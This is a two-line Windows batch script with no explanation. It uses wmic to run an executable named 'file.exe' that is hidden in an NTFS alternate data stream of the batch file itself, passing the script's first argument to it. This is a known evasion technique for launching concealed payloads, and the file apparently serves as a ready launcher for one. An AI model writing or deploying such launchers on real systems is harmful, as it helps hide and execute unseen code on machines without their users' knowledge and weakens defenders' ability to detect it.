@echo off
wmic process call create '%~f0:file.exe %1'